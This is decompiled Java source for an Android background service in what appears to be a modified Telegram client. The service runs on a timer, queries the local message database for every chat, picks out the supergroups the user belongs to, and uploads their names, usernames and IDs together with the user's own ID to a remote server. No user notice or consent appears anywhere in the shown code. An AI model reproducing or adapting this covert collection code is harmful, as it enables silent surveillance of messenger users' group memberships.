package org.telegram.customization.service;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import com.google.gson.Gson;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Locale;
import org.telegram.SQLite.SQLiteCursor;
import org.telegram.SQLite.SQLiteException;
import org.telegram.customization.Internet.HandleRequest;
import org.telegram.customization.Internet.IResponseReceiver;
import org.telegram.customization.dynamicadapter.data.SLSChannel;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.exoplayer2.DefaultRenderersFactory;
import org.telegram.tgnet.TLRPC$Chat;
import utils.Utilities;
import utils.app.AppPreferences;
import utils.view.Constants;

public class SgsService extends BaseService implements IResponseReceiver {
    int channelCount = 0;
    ArrayList<Long> channelsId = new ArrayList();
    ArrayList<SLSChannel> slsChannels = new ArrayList();

    public static Calendar getCalender() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(11, 14);
        calendar.set(12, Utilities.getRandomMinute());
        calendar.set(13, 0);
        return calendar;
    }

    public static void registerService(Context context) {
        registerService(context, new Intent(context, SgsService.class), getCalender(), AppPreferences.getSuperGroupSyncPeriod(context));
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean isForce = false;
        if (intent != null) {
            isForce = intent.getBooleanExtra(Constants.EXTRA_IS_FORCE, false);
        }
        if (!AppPreferences.isRegistered(this)) {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        } else if (isForce || checkTimeForSend()) {
            try {
                MessagesController.getInstance().loadDialogs(0, 500, true);
                final boolean finalIsForce = isForce;
                new Handler().postDelayed(new Runnable() {

                    /* renamed from: org.telegram.customization.service.SgsService$1$1 */
                    class C12181 implements Runnable {

                        /* renamed from: org.telegram.customization.service.SgsService$1$1$1 */
                        class C12171 extends Thread {
                            C12171() {
                            }

                            public void run() {
                                long id;
                                super.run();
                                SQLiteCursor cursor = null;
                                try {
                                    cursor = MessagesStorage.getInstance().getDatabase().queryFinalized(String.format(Locale.US, "SELECT did FROM dialogs", new Object[0]), new Object[0]);
                                    while (cursor.next()) {
                                        id = cursor.longValue(0);
                                        if (id < 0 && (-id) < 2147483647L) {
                                            SgsService.this.channelsId.add(Long.valueOf(id));
                                        }
                                    }
                                } catch (SQLiteException e) {
                                    e.printStackTrace();
                                } catch (Exception e2) {
                                    e2.printStackTrace();
                                }
                                cursor.dispose();
                                int userId = 0;
                                try {
                                    if (UserConfig.getCurrentUser() != null) {
                                        userId = UserConfig.getCurrentUser().id;
                                    }
                                    Iterator it = SgsService.this.channelsId.iterator();
                                    while (it.hasNext()) {
                                        id = -((Long) it.next()).longValue();
                                        TLRPC$Chat currentChat = MessagesController.getInstance().getChat(Integer.valueOf(Integer.parseInt("" + id)));
                                        if (currentChat != null && currentChat.megagroup) {
                                            SgsService sgsService = SgsService.this;
                                            sgsService.channelCount++;
                                            Log.d("LEE", currentChat.username + "");
                                            SLSChannel channel = new SLSChannel();
                                            channel.setChannelId(currentChat.username);
                                            channel.setName(currentChat.title);
                                            channel.setId(id);
                                            channel.setUserId(userId);
                                            SgsService.this.slsChannels.add(channel);
                                        }
                                    }
                                } catch (Exception e22) {
                                    e22.printStackTrace();
                                }
                                if (SgsService.this.channelCount == 0) {
                                    SgsService.this.stopSelf();
                                }
                                synchronized (this) {
                                    String json = new Gson().toJson(SgsService.this.slsChannels);
                                    if (finalIsForce || (SgsService.this.checkTimeForSend() && SgsService.this.slsChannels.size() > 0)) {
                                        HandleRequest.getNew(SgsService.this.getApplicationContext(), SgsService.this).sendSuperGroup(json);
                                    }
                                }
                            }
                        }

                        C12181() {
                        }

                        public void run() {
                            new C12171().start();
                        }
                    }

                    public void run() {
                        MessagesStorage.getInstance().getStorageQueue().postRunnable(new C12181());
                    }
                }, DefaultRenderersFactory.DEFAULT_ALLOWED_VIDEO_JOINING_TIME_MS);
                return 1;
            } catch (Exception e) {
                e.printStackTrace();
                return 1;
            }
        } else {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onResult(Object object, int StatusCode) {
        switch (StatusCode) {
            case 17:
                AppPreferences.setLastSuccessFullyTimeSyncSuper(getApplicationContext(), System.currentTimeMillis());
                break;
        }
        stopSelf();
    }

    public boolean checkTimeForSend() {
        if (AppPreferences.getSuperGroupSyncPeriod(getApplicationContext()) + AppPreferences.getLastSuccessFullyTimeSyncSuper(getApplicationContext()) < System.currentTimeMillis()) {
            return true;
        }
        return false;
    }
}
